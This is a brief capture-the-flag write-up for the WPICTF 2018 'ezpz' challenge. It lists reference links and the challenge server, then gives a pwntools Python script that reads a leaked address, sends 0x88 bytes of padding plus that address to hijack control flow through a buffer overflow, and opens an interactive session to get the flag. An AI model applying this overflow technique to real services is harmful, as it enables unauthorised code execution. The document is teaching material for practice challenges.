# Reference

[//]: <> (文章所涉及到的技术点、WriteUp的链接)

* https://github.com/wr47h/CTF-Writeups/tree/master/2018/WPICTF'18
* https://github.com/soolidsnake/Write-ups/blob/master/WPICTF/ezpz/exploit.py

# Title

[//]: <> (题目)

nc ezpz.wpictf.xyz 31337

redundant servers on 31338 and 31339

made by awg

file from https://drive.google.com/open?id=1RpTW-5_-pv6ShZEDBTAoIB_AiPkb8db9

# Content

[//]: <> (WriteUp内容)

```python
from pwn import *


r = remote('ezpz.wpictf.xyz', 31337)

msg = r.recvline()
print(msg)
address = int(msg.split(' ')[1], 16)  # 16 for hex
r.recvline()

buf  = 'A'*0x88
buf += p64(address)
r.sendline(buf)


r.interactive()
```

This gives the flag - WPI{3uffer_0verflows_r_ezpz_l3mon_5queazy}.
